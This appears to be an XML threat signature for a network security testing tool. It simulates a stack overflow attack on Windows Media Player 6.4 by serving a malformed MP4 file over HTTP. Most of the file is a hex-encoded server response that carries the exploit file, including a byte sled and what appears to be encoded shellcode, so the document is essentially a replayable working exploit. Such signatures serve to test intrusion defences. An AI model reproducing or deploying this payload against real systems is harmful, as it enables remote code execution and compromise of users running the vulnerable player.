<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Windows Media Player 6.4 MP4 File Stack Overflow Vulnerability"/>
    <EngDesc display="true" value="This threat downloads a malformed mp4 file to Demonstrate a buffer overflow in Microsoft Windows Media player. This threat is delivered via web page listening on port 80."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
      <item value="Denial_of_Service"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Windows_Media_Player"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Windows_Media_Player_6.4"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.milw0rm.com/exploits/4702"/>
    <CVEID display="true" value=""/>
    <bugtraqID display="true" value="26773"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="256c1f96c69a8d6b3799db5955fa51bc"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="true"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="633330458550781250"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1199443703" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
  </Variables>
  <Loops>
    <for index="E">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="E" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F696E6465782E68746D6C20485454502F312E300D0A486F73743A207777772E736974652E6E65740D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C2031302044656320323030372030363A31333A333220474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A204D6F6E2C2031302044656320323030372030353A30323A313020474D540D0A455461673A20223232316530362D31633235632D34343065373766613533383830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203131353239320D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20766964656F2F6D70340D0A0D0A00000020667479704D344120000000004D3441206D70343269736F6D000000000001C9176D6F6F760000006C6D76686400000000BF561DF9C1685AE60000025800002782000100000100000000000000000000000001000000000000000000000000000000010000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000200000DA07472616B0000005C746B686400000007BF561DF9BF561E0100000001000000000000278200000000000000000000000001000000000100000000000000000000000000000001000000000000000000000000000040000000000000000000000000000D3C6D646961000000206D64686400000000BF561DF9BF561E010000AC44000B580055C400000000002168646C720000000000000000736F756E0000000000000000000000000000000CF36D696E6600000010736D686400000000000000000000002464696E660000001C6472656600000000000000010000000C75726C200000000100000CB77374626C00000067737473640000000000000001000000576D703461000000000000000100000000000000000002001000000000AC44000000000033657364730000000003808080220000000480808014401500021600023CA80001F2CB0580808002121006808080010200000018737474730000000000000001000002D60000040000000028737473630000000000000002000000010000001500000001000000230000000C0000000100000B6C7374737A0000000000000000000002D60000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000070000000700000007000000CD000001FC000001F3000001CD000001B3000001D4000001AC000001800000017200000186000001CD000001A4000001A7000001B10000019B000001B300000198000001E60000017A0000019F0000018C000001AA000001610000017C000001CF000001AA0000018F0000019C0000019C000001D5000001DF0000017D000001BD0000015C00000162000001B700000180000001660000014D0000019700000176000001C70000019700000184000001C700000190000001AF00000196000001630000018E00000170000001480000018C0000020A0000017900000153000001560000014D00000133000001890000016900000170000001750000017400000146000001C100000179000001DD000001E4000001740000014C000001670000016700000172000001670000017A000001670000017A0000016400000170000001620000017F00000165000001720000018C0000019100000191000001810000019A000001B20000018500000185000001910000019600000194000001A70000019800000194000001AB0000019A000001BD000001E3000001FA000001AF000001920000018E0000016D000001660000015C00000162000001E40000018200000194000001B400000194000001B5000001EC000001DE00000195000001700000016A000001AC00000180000001C6000001BA000001D50000017200000161000001C3000001600000016D0000016E000001760000019B000001690000017700000186000001940000017B0000019300000179000001DC000001EA0000019C00000189000001820000018F00000178000001A9000001870000017B00000191000001AF000001680000016A0000016500000179000001750000017A000001690000016D000001660000015C0000016B00000188000001A0000001A8000001A00000016A0000017E0000017A0000016E0000016A00000166000001770000017100000165000001C9000001DB00000182000001810000018700000173000001850000018A000001620000016B00000164000001720000016E000001800000017F00000167000001820000018400000186000001B1000001D20000019F000001820000018E0000017F0000017F00000180000001740000019C0000017D000001850000017C000001640000017F000001CE000001E6000001EC0000016D00000172000001740000016500000166000001730000016E000001670000015B000001650000016400000216000001950000017E0000016A00000168000001730000016E0000015B00000167000001750000017B0000017A00000184000001860000017C000001840000018900000186000001AC000001B8000001A20000019C00000195000001D2000001EC0000015D0000017A000001ED000001930000017A00000178000001DE0000016F0000016300000165000001710000017B0000017D00000185000001870000019B0000017C0000017400000180000001BA000001E3000001710000017100000177000001D7000001A7000001940000018E000001DC000001920000016200000178000001680000016B000001710000017100000179000001650000016B0000018E00000192000001B2000001A60000018D00000191000001D1000001B800000187000001AA000001BB0000019A000001A900000183000001E2000001A20000016C000001720000016F0000017A000001980000017F0000019D000001950000017700000174000001C5000001AA000001D8000001820000017E000001850000019F0000018800000171000001620000017F000001CC0000016E000001770000016700000162000001670000016D00000178000001640000016B00000170000001680000016F0000016F0000017000000166000001730000015900000184000001770000016C0000017900000177000001A80000018300000190000001920000016B000001B6000001500000018D000001640000019400000141000001AA0000014E000001890000013F0000018E000001B10000014E00000139000001A0000001B30000013D0000013E000001B000000138000001830000019D00000155000001A70000017F00000158000001870000015E0000013D000001DE0000016900000162000001360000019C000001360000019F000001F4000001BA000001460000016E000001400000015A00000122000001940000017400000128000001A00000019000000182000001330000018000000196000001710000016A0000016E0000017100000178000001700000015F0000016A0000017900000188000001720000017C0000018C0000017C000001250000019A0000017C000001D000000164000001EE000001C70000017100000184000001C60000018E000001A500000161000001640000017700000179000001820000017E000001E10000016C00000165000001600000016600000177000001700000016D0000018F00000145000001760000016D000001820000017700000181000001760000018D000001840000018400000124000000FB000001230000015A000001360000013200000117000001080000016100000165000001760000019A00000171000001C80000020100000146000001670000018A000001CC00000186000001890000018000000178000001900000016F0000018D00000182000001900000017E000001A00000017B000001590000016500000168000001650000018100000174000001650000017F00000180000001870000017F000001690000015A0000016800000179000001770000016A0000014F0000015F00000160000001620000015F000001790000014E00000162000001710000016500000175000001640000016D0000016800000183000001690000016E000001FA0000011F000001420000014F0000014D0000010300000178000001A8000001EF00000123000001660000017D0000015C000001750000016B0000015D000001DA000001B500000148000001420000014A0000017B000001730000017C00000166000001710000017B0000018E00000173000001880000018A000001620000016A000001900000018B00000183000001750000018A0000017D0000015F00000180000001820000017F000001880000016B0000017B00000182000001620000016700000163000001850000017E0000016A0000017800000186000001990000017F0000018300000178000001910000019D000001840000017A0000019F0000016E0000018E00000180000001790000018800000170000001720000016900000169000001570000017D0000016D0000016D0000017B000001720000016F00000178000001660000016F0000017F000001600000017700000157000001590000016B00000165000001660000016D0000016F000001630000015D000001820000016F00000167000001650000016D000001650000018100000174000001780000016900000182000001880000016B0000017C0000017D00000172000001790000018C000000FA0000017B0000015B00000175000001780000017800000164000000F60000018A0000019A00000161000001950000015A000001960000017B00000178000001700000016B0000016F000001710000016A00000183000001620000018600000178000001660000017600000184000001730000017C0000018900000172000001730000018A0000018200000181000001830000019D0000019A0000018600000185000001A60000017D0000017D00000180000001840000018700000173000001610000017C00000168000001730000016E00000179000001780000015C00000179000001670000016C00000181000001790000016D000001770000017E000001790000009C7374636F00000000000000230001C93F0001C9D20001E4400002060D000225F9000244DE0002655E000287880002A8480002C8020002E7F0000307A1000327DE0003478B0003683C000388980003AA4C0003CAA70003E92C000407F9000426F8000444C300046508000484100004A1550004C06E0004DDF20004FC4800051AE800053A31000558E7000576B20005948C0005B3560005D2DF0001BB03756474610001BAFB6D657461000000000000002168646C7200000000000000006D6469726170706C0000000000000000000001B3E9696C73740001B1BAA96E616D0001B1B26461746100000001000000004F76657274757265313233343536373839306173050201462D010146484680404640464046808A464046404680804640464046801C464046404680044640464046800B464046404680F245454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545404550455B45404308F97488EB2BC983E9B0D9EED97424F45B817313C65A9CA183EBFCE2F43A3077EC2EA3635E393A17CDE27E17E4FAD1E0A4BE5B732A894217FEE65B77E84D6E17A0286B5C386ADE5CD5C19B56ACC7987755FD0EB889B3BF17FEE25B77C74D56D72A99469D4AC5761728AA7E80C0056B47C54D19AC2A865617D1DAF717E1CE04F42F885470F1398CFAF2A032AF93AE2DEF93990E6371AE91715DFD0A637799D379C747B794A393309E5E163245A833F7CB5E1009CFF29509DFF285096371A0325CA1A0091540533238BBB69DCB5E10308CF093A54CC962F7B24891A54AF293A54CC923131AE891A54AF1920EC95E16C9F446BF9CE5F6398CC95E163CF6C5A032FFCC4FBFF6F19F7350282130D828246B5C526CA4DE8C3818B0324B20A40A6DF1F4D338E98A5EB31E63779D0DCEF0970BF6A0970BC9F0398AF40C1F5F52F2398CF65E396D63714D0D6022023E637794A54CC929947CC195A54A5E165A9CA11C454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
  <Stateful display="false" value="true"/>
  <DestIPVarName display="false" value="$destIP"/>
</threatSignature>
